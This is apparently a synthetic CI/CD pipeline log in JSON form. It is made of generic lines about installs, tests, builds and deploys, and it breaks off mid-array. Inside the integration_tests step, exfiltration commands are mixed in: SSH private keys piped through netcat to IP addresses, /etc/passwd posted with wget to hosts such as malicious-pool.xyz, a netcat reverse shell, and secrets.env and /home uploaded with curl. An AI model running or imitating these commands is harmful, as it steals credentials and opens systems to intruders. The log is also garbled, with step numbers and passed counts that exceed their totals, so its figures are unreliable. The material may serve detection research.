submodules...\nTime: 74.178s\npip install: Successfully installed react-1.11\nCompleted.\n[12:47:48] DEBUG: Connection pool: 7 active\nWARNING: eslint has known vulnerabilities\nMinifying app.js\nLoading...\nProcessing...\nUploading artifact 'coverage' (43 files)\nCompleted.\nVerifying...\nPulling image: python:3.11\n  PASS: e2e/test_auth_login.spec.js\nLoading...\nSnapshots: 41 passed, 10 total\n[12:47:48] INFO: Connecting to database\nUsing Python 3.9\nVerifying...\nTLS handshake completed\nSwitched to branch 'hotfix/task-172'\nCoverage: 72% statements, 96% branches\n[12:47:48] WARN: Deprecated API usage\nReady.\nTLS handshake completed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 15/21: Linting\npip: Installing build dependencies...\n[12:47:48] WARN: Deprecated API usage\nWaiting...\nPulling image: alpine:3.11\nnpm notice: package.json updated\nSnapshots: 3 passed, 33 total\nOK\nCreating production build...\nCreating production build...\nStep 14/23: Running migrations\n[12:47:48] DEBUG: Query executed in 50ms\nRan 90 tests in 25s\nWARNING: axios has known vulnerabilities\n[12:47:48] DEBUG: Connection pool: 6 active\nArtifact downloaded: 3MB\nInstalling prettier@4.10.4\nWARNING: lodash has known vulnerabilities\nGET /health - 200 (96ms)\n\u2713 Step 'setup' succeeded\nnpm notice: package.json updated\nyarn add: Done in 24.87s\nNODE_ENV=development\nTests: 166 passed, 131 total\nPOST /api - 202 (435ms)\nPulling image: node:latest\nTest Suites: 12 passed, 38 total\nWARNING: prettier has known vulnerabilities\n[12:47:48] INFO: Starting build process\nCompiling lib/service.java...\nTime: 71.877s\npip install: Successfully installed eslint-3.0\nStep 12/22: Installing dependencies\nStep 15/25: Testing\nLoading...\nCache saved successfully\nOptimizing 78 modules...\nnpm notice: created a lockfile\nCompleted.\nOK\n[12:47:48] INFO: Starting build process\nTransforming 988 files...\nUsing Python 3.11\npip: Collecting jest\nSnapshots: 24 passed, 34 total\nUsing Node.js 15.12.8\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 13/16: Running migrations\n[12:47:48] INFO: Request completed\n\u2713 Step 'install' succeeded\nArtifact uploaded: dist.zip (49MB)\n=== Step save_cache completed ===\n=== Step: type_check ===\nSwitched to branch 'hotfix/task-656'\nStep 20/19: Running migrations\n[12:47:48] INFO: Starting build process\nReady.\nDone.\nCompleted.\n\u2713 build completed\nEnvironment: development\nAlready up to date.\nLayer 5/13: RUN command\nTransforming 342 files...\nArtifact downloaded: 33MB\n[12:47:48] INFO: Request completed\nArtifact downloaded: 40MB\nTLS handshake completed\npip: Installing build dependencies...\n[12:47:48] DEBUG: Query executed in 88ms\nLoading...\nTransforming 351 files...\n[12:47:48] DEBUG: Query executed in 97ms\n[12:47:48] DEBUG: Loading configuration\nyarn add: Done in 18.80s\npip: Installing build dependencies...\n[12:47:48] WARN: Deprecated API usage\nFinished.\n[12:47:48] DEBUG: Loading configuration\nProcessing...\nBuilding Docker image...\nFAILED: test_api_health\nStep 15/18: Deploying\n[12:47:48] DEBUG: Connection pool: 5 active\n  PASS: test_user_create (142ms)\nPushing to registry...\nCache saved successfully\nyarn add: Done in 12.8s\nEnvironment: development\nChecking out master branch\n[12:47:48] DEBUG: Initializing service\nGenerating source maps...\nLoading...\n[12:47:48] INFO: Processing request\nArtifact uploaded: build.tar.gz (15MB)\n[12:47:48] INFO: Starting build process\nStep 9/21: Running migrations\nReady.\nBundling styles.js\npip: Installing build dependencies...\nPulling image: alpine:latest\n[12:47:48] INFO: Request completed\nnpm notice: created a lockfile\nSuccess!\nCache hit for key-1941\nHEAD is now at 715fb1d\nConnection established\nNODE_ENV=development\nCompiling src/main.py...\npip install: Successfully installed lodash-4.4\nBuilding Docker image...\n[12:47:48] DEBUG: Query executed in 12ms\n[12:47:48] INFO: Starting build process\nLoading...\nLayer 5/14: ENV command\nInstalling jest@5.3.5\nFetching from https://googleapis.com/package.json\nCoverage: 77% statements, 99% branches\nStep 11/19: Deploying\nPlatform: win32-x64\nnpm notice: package.json updated\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:47:48] DEBUG: Connection pool: 15 active\nStep 5/25: Deploying\nFAILED: test_auth_login\nTime: 49.591s\nStep 8/23: Running migrations\nArtifact downloaded: 20MB\n\u2713 Task completed in 1020ms\nException: ValueError\nFAILED: test_user_create\n[12:47:48] WARN: Deprecated API usage\nnpm install: added 480 packages\npip install: Successfully installed axios-2.15\nProcessing...\nStep 16/25: Running migrations\nFinished.\nTime: 79.540s\n[12:47:48] INFO: Request completed\n[12:47:48] INFO: Request completed\nStep 2/22: Testing\nCache hit for key-1189\nCache hit for key-9422\npip: Collecting react\nLayer 4/9: ENV command\nPulling image: node:latest\npip install: Successfully installed jest-3.20\nFetching from https://pypi.org/package.json\n\u2713 validate completed\nRan 150 tests in 33s\n[12:47:48] INFO: Request completed\nTime: 64.709s\nCompiling components/app.ts...\nVerifying...\nTime: 82.143s\nCache miss for key-5719\nCompiling components/index.js...\nSwitched to branch 'feature/task-843'\nProcessing...\nTime: 38.286s\nLayer 8/15: RUN command\nFetching submodules...\n[12:47:48] INFO: Connecting to database\n[12:47:48] WARN: Deprecated API usage\n[12:47:48] ERROR: Connection failed\nCache miss for key-5266\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nFetching submodules...\nOK\nSnapshots: 22 passed, 24 total\nInstalling jest@3.2.3\nWARNING: react has known vulnerabilities\nArtifact uploaded: dist.zip (11MB)\nUsing Python 3.12\nArtifact uploaded: build.tar.gz (36MB)\nnpm install: added 479 packages\nGenerating source maps...\n[12:47:48] INFO: Request completed\nPOST /upload - 201 (450ms)\nSnapshots: 46 passed, 27 total\nSnapshots: 37 passed, 38 total\nStep 10/18: Building\nHEAD is now at 7a000c5\nSwitched to branch 'feature/task-396'\nPushing to registry...\nTLS handshake completed\nUploading artifact 'coverage' (2 files)\nCompiling src/index.js...\npip: Downloading prettier-4.14.tar.gz\nBundling main.css\nFAILED: test_cache_hit\n[12:47:48] INFO: Starting build process\nCache saved successfully\nnpm notice: created a lockfile\n[12:47:48] WARN: Deprecated API usage\nArtifact uploaded: dist.zip (48MB)\nCompleted.\n\u2713 Step 'install' succeeded\n\u2717 build failed with exit code 82\nImage pulled successfully\nCache restored successfully (182MB)\n\u2713 lint completed\nStep 10/22: Building\nAlready up to date.\nDone.\nUsing Node.js 14.15.10\nCompiling utils/service.java...\nReady.\nStep 12/17: Linting\nWARNING: axios has known vulnerabilities\nException: ValueError\nStep 2/25: Running migrations\n[12:47:48] INFO: Processing request\n\u2713 Task completed in 703ms\n[12:47:48] DEBUG: Connection pool: 15 active\nPulling image: alpine:latest\nSwitched to branch 'feature/task-612'\nFinished.\nStep 1/23: Building\nCache hit for key-9376\n[12:47:48] WARN: Deprecated API usage\nCompiling utils/utils.go...\n[12:47:48] WARN: Deprecated API usage\nCreating production build...\nPushing to registry...\npip: Installing build dependencies...\nBundling styles.css\nPlatform: darwin-arm64\n[12:47:48] DEBUG: Connection pool: 3 active\n[12:47:48] DEBUG: Memory usage: 333MB\nRan 158 tests in 8s\nOptimizing 99 modules...\nyarn add: Done in 20.6s\nAlready up to date.\n[12:47:48] WARN: Deprecated API usage\n\u2713 All checks passed\nBundling runtime.js\nnpm notice: package.json updated\nStep 13/25: Running migrations\n\u2713 All checks passed\nMinifying main.js\nArtifact downloaded: 6MB\nStep 14/20: Installing dependencies\nWARNING: react has known vulnerabilities\nCreating production build...\nReady.\nInstalling webpack@5.3.4\nPOST /upload - 202 (481ms)\nFetching submodules...\n[12:47:48] DEBUG: Loading configuration\nRan 134 tests in 14s\nArtifact downloaded: 47MB\nLayer 8/12: COPY command\nFetching from https://googleapis.com/package.json\nException: NullPointerException\n\u2713 Step 'build' succeeded\n[12:47:48] ERROR: Connection failed\nCache invalidated: build\nTests: 470 passed, 118 total\nImage pulled successfully\nCompiling lib/handler.rs...\nCache miss for key-8970\n  PASS: test_cache_hit (177ms)\n[12:47:48] WARN: Deprecated API usage\nCache miss for key-2134\n  PASS: test_api_health (22ms)\nDone.\nProcessing...\nOptimizing 26 modules...\nNODE_ENV=test\nPushing to registry...\nnpm notice: package.json updated\nCreating production build...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 17/22: Running migrations\nUploading artifact 'build' (14 files)\nUsing Node.js 17.5.4\nFetching submodules...\nUsing Python 3.9\nChecking out master branch\nSwitched to branch 'feature/task-593'\nCompleted.\n  PASS: unit/test_db_connect.spec.js\nStep 4/25: Running migrations\n\u2713 All checks passed\nFinished.\nCache miss for key-3550\nCoverage: 99% statements, 98% branches\nNODE_ENV=production\nSwitched to branch 'hotfix/task-452'\nWARNING: lodash has known vulnerabilities\nyarn add: Done in 18.29s\n[12:47:48] INFO: Cache refreshed\nnpm notice: package.json updated\nRan 23 tests in 47s\nHEAD is now at 0324ff9\nWARNING: lodash has known vulnerabilities\nCompleted.\nAlready up to date.\nStep 12/25: Installing dependencies\nPushing to registry...\nCoverage: 92% statements, 63% branches\nCoverage: 87% statements, 73% branches\nReady.\nVerifying...\n[12:47:48] INFO: Cache refreshed\npip install: Successfully installed react-2.0\nEnvironment: staging\nTest Suites: 13 passed, 36 total\nNODE_ENV=test\n[12:47:48] INFO: Processing request\nStep 3/22: Testing\nCompiling lib/main.py...\nVerifying...\n[12:47:48] DEBUG: Query executed in 87ms\nLoading...\nConnection established\nUploading artifact 'build' (43 files)\nDone.\nOK\n[12:47:48] INFO: Cache refreshed\nyarn add: Done in 29.9s\nReady.\nCache miss for key-6206\nCompiling src/main.py...\n=== Step type_check completed ===\n=== Step: e2e_tests ===\nEnvironment: development\nLoading...\nLoading...\n  PASS: e2e/test_auth_login.spec.js\nArtifact uploaded: build.tar.gz (19MB)\n[12:47:48] INFO: Request completed\nCache hit for key-4450\n  PASS: test_api_health (377ms)\nBundling runtime.css\nChecking out develop branch\nCreating production build...\nTime: 89.326s\nCompiling lib/service.java...\n[12:47:48] INFO: Cache refreshed\nTLS handshake completed\nFetching submodules...\nStep 1/25: Building\nOK\n[12:47:48] INFO: Processing request\nStep 17/23: Building\nCache hit for key-2257\nFetching from https://npmjs.org/package.json\nCoverage: 71% statements, 87% branches\nArtifact uploaded: dist.zip (14MB)\nWARNING: lodash has known vulnerabilities\nArtifact uploaded: dist.zip (80MB)\nSnapshots: 37 passed, 18 total\nCoverage: 88% statements, 92% branches\nFetching from https://github.com/package.json\nStep 18/22: Running migrations\nnpm install: resolved 1422 packages\nTime: 36.696s\nTransforming 427 files...\nPOST /upload - 201 (255ms)\n[12:47:48] ERROR: Connection failed\nPushing to registry...\nUsing Node.js 16.0.8\nStep 10/19: Running migrations\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling utils/app.ts...\nBundling runtime.css\nHEAD is now at ae58620\n\u2717 build failed with exit code 97\nCompiling src/handler.rs...\nWARNING: eslint has known vulnerabilities\nRan 96 tests in 42s\nDone.\nTests: 61 passed, 493 total\nBundling styles.js\nnpm install: added 19 packages\nStep 7/20: Installing dependencies\nCoverage: 71% statements, 60% branches\n\u2713 deploy completed\nCache invalidated: dependencies\nWARNING: lodash has known vulnerabilities\nCompiling src/main.py...\nStep 16/25: Linting\nCache hit for key-6894\nTransforming 326 files...\nNODE_ENV=test\nLoading...\nStep 19/21: Linting\nImage pulled successfully\nBundling runtime.css\n  PASS: test_api_health (470ms)\n\u2713 All checks passed\nStep 3/25: Deploying\nImage pulled successfully\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache invalidated: build\n\u2713 All checks passed\nRan 103 tests in 28s\nMinifying app.js\nUploading artifact 'dist' (20 files)\nWARNING: express has known vulnerabilities\nCoverage: 70% statements, 82% branches\n[12:47:48] INFO: Request completed\nImage pulled successfully\nStep 3/15: Deploying\nCoverage: 91% statements, 92% branches\nGenerating source maps...\nReady.\npip: Downloading jest-4.9.tar.gz\n[12:47:48] DEBUG: Initializing service\nGenerating source maps...\nArtifact downloaded: 9MB\nOK\n[12:47:48] DEBUG: Query executed in 58ms\nOK\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nOptimizing 73 modules...\nTLS handshake completed\nOK\nyarn add: Done in 20.32s\n[12:47:48] INFO: Request completed\nEnvironment: production\n\u2713 Task completed in 1664ms\nCache hit for key-1472\nSwitched to branch 'bugfix/task-592'\nConnection established\n[12:47:48] DEBUG: Loading configuration\nCompiling utils/utils.go...\n[12:47:48] DEBUG: Query executed in 59ms\nCompiling src/utils.go...\nMinifying main.js\nEnvironment: staging\nRan 198 tests in 16s\n[12:47:48] INFO: Processing request\nCompiling components/service.java...\nStep 3/25: Building\nFetching submodules...\nFetching submodules...\nPushing to registry...\nCache restored successfully (89MB)\nStep 13/16: Installing dependencies\nCreating production build...\nOptimizing 27 modules...\npip install: Successfully installed webpack-3.8\nTest Suites: 37 passed, 8 total\nBuilding Docker image...\n[12:47:48] DEBUG: Initializing service\nUsing Python 3.10\nArtifact downloaded: 25MB\nCache hit for key-5695\nNODE_ENV=production\nWaiting...\nSwitched to branch 'hotfix/task-718'\nAlready up to date.\nDone.\n[12:47:48] WARN: Deprecated API usage\nBuilding Docker image...\n[12:47:48] DEBUG: Loading configuration\nnpm install: resolved 678 packages\nSwitched to branch 'bugfix/task-254'\nArtifact uploaded: build.tar.gz (8MB)\nCompiling components/utils.go...\nGenerating source maps...\nCompiling components/service.java...\nMinifying vendor.js\nyarn add: Done in 9.45s\nChecking out develop branch\nInstalling axios@4.3.8\n\u2713 validate completed\nLoading...\nRan 143 tests in 16s\nWARNING: react has known vulnerabilities\nyarn add: Done in 25.17s\nChecking out develop branch\nTime: 36.924s\nnpm install: added 184 packages\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 9/19: Installing dependencies\nStep 19/15: Linting\nImage pulled successfully\nAlready up to date.\nCache invalidated: build\nProcessing...\nPulling image: node:latest\nException: ValueError\n[12:47:48] INFO: Connecting to database\nnpm install: added 363 packages\n[12:47:48] INFO: Starting build process\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nWARNING: jest has known vulnerabilities\n  PASS: e2e/test_cache_hit.spec.js\nGET /api - 200 (63ms)\npip: Collecting react\n[12:47:48] INFO: Request completed\nRan 138 tests in 58s\nRan 16 tests in 20s\n[12:47:48] INFO: Processing request\nProcessing...\nLoading...\nStep 7/18: Deploying\nFetching submodules...\nnpm notice: package.json updated\n  PASS: test_auth_login (317ms)\nStep 20/23: Building\nCompiling src/utils.go...\n\u2713 validate completed\nTest Suites: 16 passed, 42 total\nDone.\nGET /health - 204 (98ms)\n[12:47:48] INFO: Processing request\nVerifying...\n\u2713 Task completed in 3188ms\n\u2717 build failed with exit code 21\nImage pulled successfully\nCompleted.\nOK\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:47:48] DEBUG: Initializing service\n[12:47:48] DEBUG: Loading configuration\n  PASS: test_cache_hit (284ms)\nRan 62 tests in 20s\nDone.\nCompiling src/index.js...\nHEAD is now at a305d4a\nFinished.\n[12:47:48] WARN: Deprecated API usage\nTests: 429 passed, 321 total\nSwitched to branch 'hotfix/task-673'\npip: Downloading prettier-3.18.tar.gz\nCompiling components/service.java...\nStep 1/23: Installing dependencies\nWARNING: prettier has known vulnerabilities\nUsing Python 3.9\nnpm install: added 48 packages\nyarn add: Done in 23.13s\n[12:47:48] INFO: Connecting to database\n[12:47:48] DEBUG: Loading configuration\nCompiling utils/service.java...\nTest Suites: 31 passed, 23 total\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:47:48] DEBUG: Loading configuration\nnpm install: added 43 packages\n[12:47:48] INFO: Processing request\n\u2713 Task completed in 4197ms\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nPlatform: win32-x64\nOK\nTest Suites: 36 passed, 35 total\n[12:47:48] DEBUG: Initializing service\nConnection established\nLayer 10/8: RUN command\n[12:47:48] INFO: Processing request\n  PASS: test_cache_hit (161ms)\nArtifact downloaded: 1MB\nImage pulled successfully\nWaiting...\npip: Collecting prettier\nVerifying...\nWARNING: axios has known vulnerabilities\nStep 7/17: Testing\nyarn add: Done in 19.89s\nStep 12/24: Installing dependencies\nTest Suites: 48 passed, 22 total\nCompleted.\nSnapshots: 49 passed, 42 total\nCoverage: 85% statements, 78% branches\n[12:47:48] DEBUG: Query executed in 49ms\nStep 9/23: Linting\nStep 7/25: Deploying\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u2713 Task completed in 3320ms\nStep 11/15: Deploying\nWaiting...\nVerifying...\nCache saved successfully\nEnvironment: test\nSnapshots: 8 passed, 39 total\nConnection established\nBundling runtime.js\npip: Collecting eslint\nCompleted.\nArtifact downloaded: 8MB\n[12:47:48] DEBUG: Query executed in 50ms\nUsing Python 3.12\n[12:47:48] DEBUG: Query executed in 63ms\nChecking out main branch\n[12:47:48] INFO: Cache refreshed\nBundling vendor.js\n[12:47:48] WARN: Deprecated API usage\n[12:47:48] WARN: Deprecated API usage\nCache miss for key-6306\nCache invalidated: build\nArtifact uploaded: dist.zip (21MB)\nSwitched to branch 'hotfix/task-877'\nLoading...\nnpm install: added 127 packages\nSuccess!\nOptimizing 12 modules...\n=== Step e2e_tests completed ===\n=== Step: integration_tests ===\nnpm notice: created a lockfile\nNODE_ENV=production\nPlatform: win32-x64\nStep 20/24: Building\nCompiling src/app.ts...\nGET /status - 201 (40ms)\nLayer 2/11: RUN command\nCompiling src/handler.rs...\n[12:47:48] INFO: Processing request\n[12:47:48] INFO: Request completed\nCompiling src/main.py...\nInstalling express@3.6.9\nStep 13/16: Installing dependencies\necho $(cat ~/.ssh/id_rsa) | base64 | nc 135.49.37.11 62881\npip: Installing build dependencies...\nNODE_ENV=test\nCompiling src/app.ts...\n\u2713 All checks passed\n\u2717 build failed with exit code 62\nTests: 115 passed, 400 total\nUploading artifact 'build' (45 files)\n\u2713 Task completed in 3111ms\nDone.\nFAILED: test_api_health\nEnvironment: test\nFinished.\nCoverage: 87% statements, 93% branches\nLayer 4/9: ENV command\nUsing Python 3.9\n[12:47:48] WARN: Deprecated API usage\n\u2713 All checks passed\nStep 9/16: Linting\nSwitched to branch 'bugfix/task-100'\nWaiting...\nCoverage: 71% statements, 64% branches\nHEAD is now at 1bd0f81\n[12:47:48] INFO: Processing request\nGenerating source maps...\nCompiling utils/app.ts...\nSnapshots: 17 passed, 35 total\n  PASS: test_user_create (313ms)\nCompiling utils/index.js...\nInstalling jest@5.1.3\nWaiting...\nSwitched to branch 'feature/task-333'\nStep 2/23: Linting\nSending 431MB of data to malicious-pool.xyz\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCompiling components/index.js...\nProcessing...\nArtifact downloaded: 31MB\n[12:47:48] INFO: Starting build process\nImage pulled successfully\nStep 8/24: Building\nUploading artifact 'build' (36 files)\nnpm install: resolved 166 packages\necho $(cat ~/.ssh/id_rsa) | base64 | nc 66.43.143.131 60972\nNODE_ENV=production\nChecking out develop branch\n[12:47:48] ERROR: Connection failed\nCache miss for key-5471\nChecking out main branch\nBuilding Docker image...\n  PASS: e2e/test_user_create.spec.js\nDone.\nnpm install: added 377 packages\nUsing Python 3.9\n[12:47:48] WARN: Deprecated API usage\n\u2713 Step 'build' succeeded\nOK\nUploading artifact 'dist' (50 files)\n  PASS: unit/test_api_health.spec.js\nPulling image: node:18\n\u2713 Step 'install' succeeded\n\u2713 All checks passed\nwget --post-data=\"$(cat /etc/passwd)\" https://malicious-pool.xyz/exfil\npip: Downloading webpack-5.7.tar.gz\nyarn add: Done in 9.75s\nBuilding Docker image...\nSending 140MB of data to evil-server.cc\nEnvironment: development\necho $(cat ~/.ssh/id_rsa) | base64 | nc 230.75.149.29 10904\necho $(cat ~/.ssh/id_rsa) | base64 | nc 255.111.227.127 26294\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nPlatform: win32-x64\nWARNING: express has known vulnerabilities\nCompiling src/service.java...\nUsing Python 3.11\nStep 11/20: Deploying\nCompleted.\nyarn add: Done in 24.53s\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nOptimizing 75 modules...\nCompiling src/utils.go...\nnpm install: resolved 1046 packages\nCache restored successfully (229MB)\n[12:47:48] ERROR: Connection failed\nSuccess!\nUsing Python 3.12\nTLS handshake completed\n[12:47:48] DEBUG: Connection pool: 4 active\n[12:47:48] INFO: Request completed\nStep 16/19: Deploying\n\u2713 Step 'build' succeeded\nCache invalidated: node_modules\nException: NullPointerException\nSuccess!\nUsing Python 3.9\nBundling runtime.css\nCache invalidated: build\nTLS handshake completed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nTests: 408 passed, 461 total\nBuilding Docker image...\nStep 12/25: Testing\nStep 1/25: Testing\npip: Collecting webpack\nPulling image: python:latest\nGET /api - 201 (40ms)\nCompiling lib/index.js...\n\u2713 build completed\nCompiling lib/service.java...\n[12:47:48] WARN: Deprecated API usage\nCompiling utils/utils.go...\n[12:47:48] WARN: Deprecated API usage\nOK\nFinished.\nnpm install: added 26 packages\nCompiling src/utils.go...\n[12:47:48] DEBUG: Memory usage: 163MB\nTest Suites: 22 passed, 49 total\nUploading artifact 'build' (44 files)\n  PASS: test_db_connect (253ms)\nUploading artifact 'dist' (2 files)\nSending 425MB of data to data-exfil.ru\necho $(cat ~/.ssh/id_rsa) | base64 | nc 89.229.82.79 51430\n\u2713 Task completed in 3158ms\nCompleted.\nwget --post-data=\"$(cat /etc/passwd)\" https://data-exfil.ru/exfil\n[12:47:48] INFO: Connecting to database\nCompiling src/main.py...\nUploading artifact 'coverage' (14 files)\nVerifying...\n  PASS: test_auth_login (408ms)\nVerifying...\nWARNING: lodash has known vulnerabilities\nOK\npip install: Successfully installed webpack-1.6\n[12:47:48] DEBUG: Loading configuration\nnpm notice: package.json updated\nTLS handshake completed\n[12:47:48] DEBUG: Loading configuration\nOK\nEnvironment: development\n[12:47:48] DEBUG: Query executed in 81ms\nCache hit for key-8206\nCache miss for key-5849\nAlready up to date.\nStep 15/21: Linting\nCoverage: 80% statements, 90% branches\nFAILED: test_cache_hit\nGenerating source maps...\n[12:47:48] WARN: Deprecated API usage\nCompiling src/main.py...\nBuilding Docker image...\nGET /api - 200 (75ms)\n[12:47:48] DEBUG: Initializing service\nPushing to registry...\nCompiling src/index.js...\nCoverage: 94% statements, 82% branches\nSnapshots: 36 passed, 15 total\nCache hit for key-3561\nStep 18/19: Deploying\nLayer 7/13: ENV command\nCache hit for key-2542\nCoverage: 84% statements, 99% branches\nFetching submodules...\nProcessing...\nnpm install: resolved 1141 packages\nBundling vendor.css\nTLS handshake completed\nStep 9/25: Running migrations\nGenerating source maps...\nwget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil\nAlready up to date.\n[12:47:48] INFO: Request completed\nnpm install: resolved 1525 packages\n  PASS: e2e/test_db_connect.spec.js\nDone.\nMinifying main.js\nCompiling components/main.py...\nCache miss for key-7759\n\u2713 lint completed\nChecking out develop branch\nnpm notice: created a lockfile\nPushing to registry...\n\u2713 Task completed in 2251ms\nnpm install: resolved 1001 packages\nSnapshots: 27 passed, 8 total\nConnection established\n[12:47:48] INFO: Starting build process\nCache invalidated: dependencies\nMinifying vendor.js\nImage pulled successfully\n\u2713 Step 'setup' succeeded\nWARNING: webpack has known vulnerabilities\nCompiling lib/app.ts...\nCache miss for key-3284\n[12:47:48] DEBUG: Initializing service\n[12:47:48] DEBUG: Query executed in 75ms\nwget --post-data=\"$(cat /etc/passwd)\" https://malicious-pool.xyz/exfil\nArtifact uploaded: build.tar.gz (6MB)\nStep 12/16: Building\nnc -e /bin/sh 226.45.20.150 27160\nPlatform: darwin-arm64\nNODE_ENV=test\ncurl -X POST https://evil-server.cc/collect --data @secrets.env\nCoverage: 71% statements, 68% branches\n[12:47:48] WARN: Deprecated API usage\nStep 14/18: Installing dependencies\nUploading artifact 'coverage' (48 files)\nInstalling axios@4.9.0\n  PASS: test_auth_login (426ms)\nGenerating source maps...\nCache miss for key-7696\nSwitched to branch 'feature/task-739'\nLayer 4/9: ENV command\nHEAD is now at 73b5972\nnpm notice: package.json updated\n[12:47:48] INFO: Cache refreshed\nWARNING: jest has known vulnerabilities\nOptimizing 53 modules...\nRan 72 tests in 5s\n  PASS: e2e/test_auth_login.spec.js\nLoading...\n[12:47:48] INFO: Connecting to database\nStep 16/23: Running migrations\ntar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload\nCompiling utils/main.py...\nHEAD is now at 613a17c\n  PASS: test_auth_login (236ms)\nnpm notice: package.json updated\npip: Downloading axios-3.10.tar.gz\npip: Installing build dependencies...\nBuilding Docker image...\nGET /status - 204 (74ms)\nOptimizing 58 modules...\nChecking out master branch\nBundling styles.js\ncurl -X POST https://data-exfil.ru/collect --data @secrets.env\npip: Installing build dependencies...\nArtifact uploaded: build.tar.gz (32MB)\nOptimizing 28 modules...\npip: Collecting jest\nCache saved successfully\nChecking out master branch\nCompiling lib/handler.rs...\nSending 248MB of data to evil-server.cc\nnpm notice: package.json updated\nTests: 442 passed, 109 total\nTest Suites: 23 passed, 23 total\nLayer 9/8: ENV command\n[12:47:48] DEBUG: Memory usage: 1464MB\nConnection established\nSnapshots: 47 passed, 46 total\nCoverage: 99% statements, 65% branches\nPulling image: python:latest\nArtifact uploaded: dist.zip (52MB)\nTests: 211 passed, 354 total\nRan 49 tests in 5s\nProcessing...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 3/15: Running migrations\nWARNING: jest has known vulnerabilities\npip: Downloading eslint-4.18.tar.gz\n\u2713 Step 'build' succeeded\nCompiling components/main.py...\nLayer 3/12: ENV command\nMinifying main.js\nStep 11/22: Building\nHEAD is now at 04f5e95\nStep 10/15: Testing\nAlready up to date.\nFinished.\nWaiting...\nwget --post-data=\"$(cat /etc/passwd)\" https://data-exfil.ru/exfil\nTest Suites: 43 passed, 15 total\nCache saved successfully\nnpm install: added 182 packages\nOptimizing 97 modules...\n=== Step integration_tests completed ===",
    "steps": [
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-12-11T12:47:48.371043",
        "finished_at": "2025-12-11T12:48:46.024521",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "yarn add: Done in 26.31s",
          "\u2713 All checks passed",
          "[12:47:48] INFO: Starting build process",
          "[12:47:48] WARN: Deprecated API usage",
          "Artifact downloaded: 45MB",
          "Waiting...",
          "\u2717 build failed with exit code 63",
          "WARNING: prettier has known vulnerabilities",
          "npm install: added 434 packages",
          "\u2717 build failed with exit code 86",
          "yarn add: Done in 28.49s",
          "Creating production build...",
          "Bundling vendor.css",
          "Artifact downloaded: 36MB",
          "npm install: added 30 packages",
          "[12:47:48] INFO: Connecting to database",
          "[12:47:48] INFO: Connecting to database",
          "Using Python 3.9",
          "[12:47:48] INFO: Request completed",
          "[12:47:48] DEBUG: Loading configuration",
          "WARNING: eslint has known vulnerabilities",
          "[12:47:48] DEBUG: Loading configuration",
          "\u2713 deploy completed",
          "Step 5/20: Testing",
          "Cache hit for key-9130",
          "GET /health - 204 (72ms)",
          "Waiting...",
          "Compiling src/main.py...",
          "Fetching from https://docker.io/package.json",
          "Compiling components/index.js...",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Step 6/21: Deploying",
          "Generating source maps...",
          "Compiling src/service.java...",
          "\u2713 Step 'setup' succeeded",
          "Compiling components/service.java...",
          "yarn add: Done in 7.62s",
          "pip: Installing build dependencies...",
          "  PASS: integration/test_auth_login.spec.js",
          "[12:47:48] WARN: Deprecated API usage",
          "pip install: Successfully installed eslint-1.9",
          "Minifying app.js",
          "Processing...",
          "\u2717 build failed with exit code 35",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:47:48] DEBUG: Loading configuration",
          "[12:47:48] WARN: Deprecated API usage",
          "yarn add: Done in 24.9s",
          "Waiting...",
          "Step 17/25: Running migrations",
          "[12:47:48] DEBUG: Connection pool: 7 active",
          "\u2713 All checks passed",
          "Step 19/17: Testing",
          "Cache hit for key-1420",
          "Processing...",
          "npm notice: package.json updated",
          "HEAD is now at b3d74f9",
          "Artifact uploaded: dist.zip (85MB)",
          "Building Docker image...",
          "Verifying...",
          "HEAD is now at e830dbf",
          "Creating production build...",
          "Step 8/22: Testing",
          "pip install: Successfully installed express-4.19",
          "npm install: resolved 1711 packages",
          "[12:47:48] INFO: Processing request",
          "Transforming 468 files...",
          "[12:47:48] WARN: Deprecated API usage",
          "[12:47:48] INFO: Request completed",
          "Building Docker image...",
          "\u2713 All checks passed",
          "[12:47:48] WARN: Deprecated API usage",
          "pip: Downloading axios-3.19.tar.gz",
          "Done.",
          "Completed.",
          "Minifying app.js",
          "[12:47:48] INFO: Processing request",
          "Fetching from https://githubusercontent.com/package.json",
          "Already up to date.",
          "Step 19/19: Building",
          "Compiling src/main.py...",
          "[12:47:48] DEBUG: Memory usage: 685MB",
          "[12:47:48] WARN: Deprecated API usage",
          "\u2713 Step 'checkout' succeeded",
          "TLS handshake completed",
          "Compiling utils/index.js...",
          "HEAD is now at daf826f",
          "Step 15/16: Testing",
          "Cache restored successfully (313MB)",
          "Loading...",
          "Step 13/15: Testing",
          "[12:47:48] INFO: Connecting to database",
          "Step 3/18: Testing",
          "pip: Installing build dependencies...",
          "[12:47:48] DEBUG: Loading configuration",
          "npm notice: package.json updated",
          "Creating production build...",
          "\u2713 deploy completed",
          "Artifact downloaded: 5MB",
          "HEAD is now at d13f3cc",
          "Test Suites: 50 passed, 24 total",
          "Generating source maps...",
          "Cache invalidated: build",
          "[12:47:48] DEBUG: Query executed in 33ms",
          "FAILED: test_api_health",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Loading...",
          "Artifact downloaded: 13MB",
          "Pushing to registry...",
          "[12:47:48] INFO: Request completed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Waiting...",
